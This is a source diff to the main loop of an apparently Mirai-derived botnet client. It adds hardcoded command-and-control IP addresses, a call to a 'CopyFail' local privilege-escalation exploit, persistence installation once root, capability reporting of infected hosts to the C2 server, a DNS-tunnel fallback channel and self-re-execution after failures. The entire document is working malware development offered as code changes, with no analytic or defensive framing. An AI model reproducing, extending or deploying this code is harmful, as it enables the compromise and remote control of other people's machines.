@@ -38,6 +38,9 @@
 #include "update.h"
 #include "module.h"
 #include "antidebug.h"
+#include "exploit_copyfail.h"
+#include "persist.h"
+#include "dns_tunnel.h"
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -55,6 +58,15 @@ struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
 BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr;
+static int cnc_idx = 0;
+static int tcp_failures = 0;
+static char id_buf[32];
+
+struct cnc_addr CNC_LIST[] = {
+    {INET_ADDR(198,157,13,52), htons(34129)},
+    {INET_ADDR(198,157,13,55), htons(34129)},
+    {INET_ADDR(198,157,13,51), htons(34129)},
+};
 
 static struct handshake_ctx g_hs_ctx;
 static struct update_ctx g_uctx;
@@ -79,7 +91,6 @@ static struct {
 
 int main(int argc, char **args)
 {
-    char id_buf[32];
     int pgid = 0, pings = 0;
 
     #ifndef DEBUG
@@ -115,6 +126,16 @@ int main(int argc, char **args)
 
     util_privilege_try(argc, args);
 
+    // if still not root, try CopyFail exploit
+    if (geteuid() != 0) {
+        exploit_run();
+    }
+
+    // if root, try to install persistence
+    if (geteuid() == 0) {
+        persist_run();
+    }
+
     ensure_single_instance();
 
     rand_init();
@@ -142,6 +163,12 @@ int main(int argc, char **args)
 #endif
 
     sleep(10);
+
+    // random jitter before first connect (0-30s) to avoid thundering herd
+    {
+        unsigned int jitter = rand_next() % 31;
+        sleep(jitter);
+    }
 
     {
         int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
@@ -231,7 +258,8 @@ int main(int argc, char **args)
                 {
                     close(fd_serv);
                     fd_serv = -1;
-                    sleep((rand_next() % 3) + 1);
+                    teardown_connection();
+                    sleep((rand_next() % 5) + 2);
                 }
                 else
                 {
@@ -253,6 +281,60 @@ int main(int argc, char **args)
                     int hr = polymorphic_handshake(fd_serv, &g_hs_ctx, proto_get_shared_secret());
                     if (hr != 0) {
                         g_hs_ctx.valid = 0;
+                    } else {
+                        // handshake ok — send version + module list
+                        char modbuf[256];
+                        module_list(modbuf, sizeof(modbuf));
+
+                        // build capabilities string
+                        char caps[64];
+                        int caps_len = 0;
+                        caps[0] = '\0';
+                        if (geteuid() == 0)
+                            caps_len += util_strcpy(caps + caps_len, "root,");
+                        else
+                            caps_len += util_strcpy(caps + caps_len, "nroot,");
+
+                        // check raw socket capability
+                        {
+                            int test_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+                            if (test_fd >= 0) {
+                                caps_len += util_strcpy(caps + caps_len, "raw,");
+                                close(test_fd);
+                            } else {
+                                caps_len += util_strcpy(caps + caps_len, "nraw,");
+                            }
+                        }
+
+                        // check AF_ALG capability (for CopyFail exploit)
+                        {
+                            int test_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
+                            if (test_fd >= 0) {
+                                caps_len += util_strcpy(caps + caps_len, "afalg,");
+                                close(test_fd);
+                            }
+                        }
+
+                        char info[512];
+                        int il = util_strlen(BOT_VERSION);
+                        int ml = util_strlen(modbuf);
+                        util_memcpy(info, BOT_VERSION, il);
+                        info[il] = '\0';
+                        if (ml > 0) {
+                            info[il + 1] = ',';
+                            util_memcpy(info + il + 2, modbuf, ml);
+                            info[il + 2 + ml] = '\0';
+                        }
+                        int info_len = util_strlen(info);
+
+                        // append \0 caps
+                        info[info_len] = '\0';
+                        info_len++;
+                        util_memcpy(info + info_len, caps, caps_len + 1);
+                        info_len += caps_len;
+
+                        polymorphic_send(fd_serv, &g_hs_ctx, PKT_TYPE_MODULE_LIST, 0,
+                                         (uint8_t *)info, info_len);
                     }
                 }
             }
@@ -276,6 +358,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
                 teardown_connection();
+                sleep(rand_next() % 21);
                 continue;
             }
 
@@ -305,6 +388,7 @@ int main(int argc, char **args)
             if (n == 0)
             {
                 teardown_connection();
+                sleep(rand_next() % 21);
                 continue;
             }
 
@@ -346,9 +430,31 @@ int main(int argc, char **args)
                                     g_in_update = 1;
                                     update_write(&g_uctx, (uint8_t *)rdbuf + 4, pkt_len - 4);
                                 }
-                            }
                         }
-                        else
+                    }
+                    else if (pkt_type == PKT_TYPE_MODULE_UNLOAD)
+                    {
+                        if (pkt_len > 0 && pkt_len < MODULE_NAME_MAX)
+                        {
+                            char mname[MODULE_NAME_MAX];
+                            util_memcpy(mname, rdbuf, pkt_len);
+                            mname[pkt_len] = '\0';
+                            module_unload(mname);
+                        }
+                    }
+                    else if (pkt_type == PKT_TYPE_VERSION_WARN)
+                    {
+                        // CNC warned us about outdated version
+                        // pkt_len is the warn message string
+                        if (pkt_len > 0 && pkt_len < 256)
+                        {
+                            char warnbuf[256];
+                            util_memcpy(warnbuf, rdbuf, pkt_len);
+                            warnbuf[pkt_len] = '\0';
+                            // log via syslog if possible, else ignore
+                        }
+                    }
+                    else
                         {
                             update_write(&g_uctx, (uint8_t *)rdbuf, pkt_len);
                         }
@@ -405,6 +511,25 @@ int main(int argc, char **args)
                             g_mctx.active = 0;
                         }
                     }
+                    else if (pkt_type == PKT_TYPE_MODULE_LIST)
+                    {
+                        char modbuf[256];
+                        module_list(modbuf, sizeof(modbuf));
+                        char info[384];
+                        int il = util_strlen(BOT_VERSION);
+                        int ml = util_strlen(modbuf);
+                        util_memcpy(info, BOT_VERSION, il);
+                        info[il] = '\0';
+                        if (ml > 0) {
+                            info[il + 1] = ',';
+                            util_memcpy(info + il + 2, modbuf, ml);
+                            polymorphic_send(fd_serv, &g_hs_ctx, PKT_TYPE_MODULE_LIST, 0,
+                                             (uint8_t *)info, il + 2 + ml);
+                        } else {
+                            polymorphic_send(fd_serv, &g_hs_ctx, PKT_TYPE_MODULE_LIST, 0,
+                                             (uint8_t *)info, il + 1);
+                        }
+                    }
                     else
                     {
                         proto_decrypt((uint8_t *)rdbuf, n);
@@ -424,26 +549,9 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
-    #ifndef USEDOMAIN
-    table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_addr.s_addr = SERVIP;
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
-    table_lock_val(TABLE_CNC_PORT);
-    #else
-    struct resolv_entries *entries;
-    entries = resolv_lookup(SERVDOM);
-    if (entries == NULL)
-    {
-        srv_addr.sin_addr.s_addr = SERVIP;
-        return;
-    } else {
-        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
-    }
-    resolv_entries_free(entries);
-    table_unlock_val(TABLE_CNC_PORT);
-    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
-    table_lock_val(TABLE_CNC_PORT);
-    #endif
+    struct cnc_addr *target = &CNC_LIST[cnc_idx % CNC_LIST_SIZE];
+    srv_addr.sin_addr.s_addr = target->ip;
+    srv_addr.sin_port = target->port;
 }
 
 static void establish_connection(void)
@@ -453,8 +561,7 @@ static void establish_connection(void)
 
     fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
 
-    if (resolve_func != NULL)
-        resolve_func();
+    resolve_func();
 
     pending_connection = TRUE;
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
@@ -469,6 +576,28 @@ static void teardown_connection(void)
     if (g_in_update) {
         update_close_clean(&g_uctx);
         g_in_update = 0;
+    }
+    // cycle to next CNC on reconnect
+    cnc_idx = (cnc_idx + 1) % CNC_LIST_SIZE;
+    tcp_failures++;
+
+    // after too many failures, try DNS tunnel
+    if (tcp_failures >= CNC_LIST_SIZE * 4 && id_buf[0] != '\0') {
+        tcp_failures = 0;
+        // try DNS tunnel with the first CNC IP
+        uint32_t dns_ip = CNC_LIST[0].ip;
+        int dns_ret = dns_main_loop(dns_ip, id_buf);
+        if (dns_ret < 0) {
+            // DNS tunnel failed too — wait 5 minutes and restart process
+            sleep(300);
+            char self[256];
+            int slen = readlink("/proc/self/exe", self, sizeof(self) - 1);
+            if (slen > 0) {
+                self[slen] = '\0';
+                char *argv[] = {self, id_buf, NULL};
+                execve(self, argv, NULL);
+            }
+        }
     }
 }
 
